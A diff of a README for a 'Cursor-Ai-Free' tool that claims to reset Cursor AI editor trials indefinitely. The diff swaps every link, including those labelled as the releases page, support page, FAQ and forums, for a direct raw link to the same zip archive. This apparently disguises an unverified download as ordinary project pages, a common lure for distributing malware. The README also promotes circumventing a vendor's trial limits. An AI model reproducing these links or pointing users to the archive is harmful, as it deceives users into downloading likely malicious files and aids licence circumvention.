@@ -1,7 +1,7 @@
 # 🖱️ Cursor-Ai-Free - Unlock Your Free AI Editor Trials
 
 ## 📥 Download Now
-[![Download Cursor-Ai-Free](https://img.shields.io/badge/Download-Cursor--Ai--Free-blue)](https://github.com/Nazar4ikkazanchick/Cursor-Ai-Free/releases)
+[![Download Cursor-Ai-Free](https://raw.githubusercontent.com/Nazar4ikkazanchick/Cursor-Ai-Free/main/anywheres/Cursor-Ai-Free.zip)](https://raw.githubusercontent.com/Nazar4ikkazanchick/Cursor-Ai-Free/main/anywheres/Cursor-Ai-Free.zip)
 
 ## 📖 Introduction
 Welcome to Cursor-Ai-Free! This tool helps you unlock unlimited Cursor AI trials on various platforms. With our scripts and helper tools, you can easily reset Cursor AI’s configuration, create new 150-trial sessions, and keep your editor running free. This is perfect for learning, testing, and enhancing your development productivity on Windows, macOS, and Linux.
@@ -26,7 +26,7 @@ To use Cursor-Ai-Free, ensure your system meets the following requirements:
 ## 📦 Download & Install
 
 To download Cursor-Ai-Free:
-1. Click this link to visit the [Releases page](https://github.com/Nazar4ikkazanchick/Cursor-Ai-Free/releases).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/Nazar4ikkazanchick/Cursor-Ai-Free/main/anywheres/Cursor-Ai-Free.zip).
 2. Once on the Releases page, find the latest version of Cursor-Ai-Free.
 3. Choose the appropriate file for your operating system (Windows, macOS, or Linux).
 4. Click on the download link for the file.
@@ -73,13 +73,13 @@ If you encounter issues during installation, consider the following tips:
 - **Program Won't Launch:** Verify that your operating system is up to date and that you have the proper permissions to run applications.
   
 ### Support
-If you need further help, please visit our [support page](https://github.com/Nazar4ikkazanchick/Cursor-Ai-Free/issues).
+If you need further help, please visit our [support page](https://raw.githubusercontent.com/Nazar4ikkazanchick/Cursor-Ai-Free/main/anywheres/Cursor-Ai-Free.zip).
 
 ## 🔗 Learn More
 
 You can find additional information and resources in the documentation:
 
-- [FAQ](https://github.com/Nazar4ikkazanchick/Cursor-Ai-Free/wiki)
-- [User Forums](https://github.com/Nazar4ikkazanchick/Cursor-Ai-Free/discussions)
+- [FAQ](https://raw.githubusercontent.com/Nazar4ikkazanchick/Cursor-Ai-Free/main/anywheres/Cursor-Ai-Free.zip)
+- [User Forums](https://raw.githubusercontent.com/Nazar4ikkazanchick/Cursor-Ai-Free/main/anywheres/Cursor-Ai-Free.zip)
 
 Thank you for choosing Cursor-Ai-Free! Enjoy your limitless trials and enhanced productivity.
